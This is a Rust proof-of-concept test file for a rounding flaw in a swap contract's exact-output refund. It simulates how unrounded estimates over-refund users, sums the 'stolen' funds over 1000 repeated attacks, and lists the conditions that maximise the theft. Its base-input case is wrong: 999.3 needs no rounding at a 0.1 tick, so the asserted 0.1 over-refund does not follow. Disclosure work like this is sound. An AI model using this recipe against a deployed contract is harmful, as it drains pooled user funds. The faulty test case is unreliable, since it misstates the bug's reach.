use cosmwasm_std::{coin, Addr, Coin, Uint128};
use injective_math::FPDecimal;

/// Proof-of-Concept Test for SwapExactOutput Over-Refund Vulnerability
/// 
/// This test demonstrates how the rounding mismatch between estimation.result_quantity 
/// and required_input leads to systematic over-refunding from contract funds.
#[cfg(test)]
mod vulnerability_poc {
    use super::*;

    /// Simulates the vulnerable refund calculation from swap.rs lines 52-86
    fn simulate_vulnerable_refund_calculation(
        coin_provided_amount: u128,
        estimation_result_quantity: FPDecimal,
        is_input_quote: bool,
        min_quantity_tick_size: FPDecimal,
    ) -> (FPDecimal, FPDecimal, FPDecimal) {
        // This mirrors the logic in swap.rs lines 69-73
        let required_input = if is_input_quote {
            estimation_result_quantity.int() + FPDecimal::ONE  // ⚠️ Rounds up
        } else {
            round_up_to_min_tick(estimation_result_quantity, min_quantity_tick_size)
        };

        // This mirrors the logic in swap.rs line 86 
        let refund_amount = FPDecimal::from(coin_provided_amount) - estimation_result_quantity;  // ⚠️ Uses unrounded estimation

        // What the refund SHOULD be (actual unused funds)
        let correct_refund = FPDecimal::from(coin_provided_amount) - required_input;

        // The over-refund amount (stolen from contract)
        let over_refund = refund_amount - correct_refund;

        (refund_amount, correct_refund, over_refund)
    }

    /// Helper function for rounding up to minimum tick (from helpers.rs)
    fn round_up_to_min_tick(num: FPDecimal, min_tick: FPDecimal) -> FPDecimal {
        if num < min_tick {
            return min_tick;
        }

        let remainder = FPDecimal::from(num.num % min_tick.num);

        if remainder.num.is_zero() {
            return num;
        }

        FPDecimal::from(num.num - remainder.num + min_tick.num)
    }

    #[test]
    fn test_vulnerability_quote_input_exact_integer_estimation() {
        // Case 1: estimation.result_quantity is exactly 100.0
        let coin_provided = 105u128; // User provides 105 tokens
        let estimation = FPDecimal::from(100u128); // Estimation is exactly 100.0
        let is_input_quote = true;

        let (refund, correct_refund, over_refund) = simulate_vulnerable_refund_calculation(
            coin_provided,
            estimation,
            is_input_quote,
            FPDecimal::from(1u128), // Not used for quote input
        );

        println!("=== Case 1: Exact Integer Estimation ===");
        println!("User provided: {}", coin_provided);
        println!("Estimation: {}", estimation);
        println!("Required input: {}", estimation.int() + FPDecimal::ONE);
        println!("Vulnerable refund: {}", refund);
        println!("Correct refund: {}", correct_refund);
        println!("Over-refund (stolen): {}", over_refund);

        // When estimation is exactly 100.0:
        // required_input = 100 + 1 = 101
        // refund = 105 - 100 = 5
        // correct_refund = 105 - 101 = 4  
        // over_refund = 5 - 4 = 1 ← STOLEN FROM CONTRACT
        assert_eq!(over_refund, FPDecimal::ONE);
    }

    #[test]
    fn test_vulnerability_quote_input_fractional_estimation() {
        // Case 2: estimation.result_quantity has fractional part
        let coin_provided = 105u128;
        let estimation = FPDecimal::from_str("100.3").unwrap(); // 100.3 tokens needed
        let is_input_quote = true;

        let (refund, correct_refund, over_refund) = simulate_vulnerable_refund_calculation(
            coin_provided,
            estimation,
            is_input_quote,
            FPDecimal::from(1u128),
        );

        println!("\n=== Case 2: Fractional Estimation ===");
        println!("User provided: {}", coin_provided);
        println!("Estimation: {}", estimation);
        println!("Required input: {}", estimation.int() + FPDecimal::ONE);
        println!("Vulnerable refund: {}", refund);
        println!("Correct refund: {}", correct_refund);
        println!("Over-refund (stolen): {}", over_refund);

        // When estimation is 100.3:
        // required_input = floor(100.3) + 1 = 100 + 1 = 101
        // refund = 105 - 100.3 = 4.7
        // correct_refund = 105 - 101 = 4
        // over_refund = 4.7 - 4 = 0.7 ← STOLEN FROM CONTRACT
        assert_eq!(over_refund, FPDecimal::from_str("0.7").unwrap());
    }

    #[test]
    fn test_vulnerability_base_input_path() {
        // Case 3: Base input path (different rounding logic)
        let coin_provided = 1000u128;
        let estimation = FPDecimal::from_str("999.3").unwrap();
        let is_input_quote = false;
        let min_tick = FPDecimal::from_str("0.1").unwrap(); // 0.1 minimum tick size

        let (refund, correct_refund, over_refund) = simulate_vulnerable_refund_calculation(
            coin_provided,
            estimation,
            is_input_quote,
            min_tick,
        );

        println!("\n=== Case 3: Base Input Path ===");
        println!("User provided: {}", coin_provided);
        println!("Estimation: {}", estimation);
        println!("Min tick size: {}", min_tick);
        println!("Required input (rounded up): {}", round_up_to_min_tick(estimation, min_tick));
        println!("Vulnerable refund: {}", refund);
        println!("Correct refund: {}", correct_refund);
        println!("Over-refund (stolen): {}", over_refund);

        // When estimation is 999.3 and min_tick is 0.1:
        // required_input = round_up_to_min_tick(999.3, 0.1) = 999.4
        // refund = 1000 - 999.3 = 0.7
        // correct_refund = 1000 - 999.4 = 0.6
        // over_refund = 0.7 - 0.6 = 0.1 ← STOLEN FROM CONTRACT
        assert_eq!(over_refund, FPDecimal::from_str("0.1").unwrap());
    }

    #[test]
    fn test_attack_scenario_simulation() {
        // Simulate repeated attacks
        println!("\n=== Attack Scenario Simulation ===");
        
        let mut total_stolen = FPDecimal::ZERO;
        let attack_count = 1000;
        
        for i in 1..=attack_count {
            // Each attack uses slightly different amounts to vary the fractional part
            let coin_provided = 100 + i;
            let estimation = FPDecimal::from(100u128) + FPDecimal::from_str("0.123").unwrap(); // 100.123
            
            let (_, _, over_refund) = simulate_vulnerable_refund_calculation(
                coin_provided,
                estimation,
                true, // is_input_quote = true
                FPDecimal::ONE,
            );
            
            total_stolen = total_stolen + over_refund;
        }
        
        println!("Number of attacks: {}", attack_count);
        println!("Total stolen from contract: {}", total_stolen);
        println!("Average stolen per attack: {}", total_stolen / FPDecimal::from(attack_count));
        
        // With 1000 attacks, each stealing ~0.877 units (1 - 0.123), 
        // total stolen ≈ 877 units from contract funds
        assert!(total_stolen > FPDecimal::from(800u128));
    }

    /// Demonstrates the exact code path that would be exploited
    #[test]
    fn test_exact_exploit_conditions() {
        println!("\n=== Exact Exploit Conditions ===");
        
        // Conditions for maximum exploitation:
        // 1. is_input_quote = true (first market quotes in source denom)
        // 2. estimation.result_quantity is close to integer (maximize over-refund)
        // 3. Contract has sufficient buffer funds
        
        let scenarios = vec![
            ("Worst case (integer estimation)", FPDecimal::from(100u128)),
            ("High theft (0.1 fractional)", FPDecimal::from_str("100.1").unwrap()),
            ("Medium theft (0.5 fractional)", FPDecimal::from_str("100.5").unwrap()),
            ("Low theft (0.9 fractional)", FPDecimal::from_str("100.9").unwrap()),
        ];
        
        for (description, estimation) in scenarios {
            let coin_provided = 105u128;
            let (_, _, over_refund) = simulate_vulnerable_refund_calculation(
                coin_provided,
                estimation,
                true,
                FPDecimal::ONE,
            );
            
            println!("{}: over-refund = {}", description, over_refund);
        }
        
        // Key insight: Over-refund = 1 - fractional_part
        // Maximum when fractional_part approaches 0 (integer estimation)
        // Minimum when fractional_part approaches 1
    }
}

use std::str::FromStr;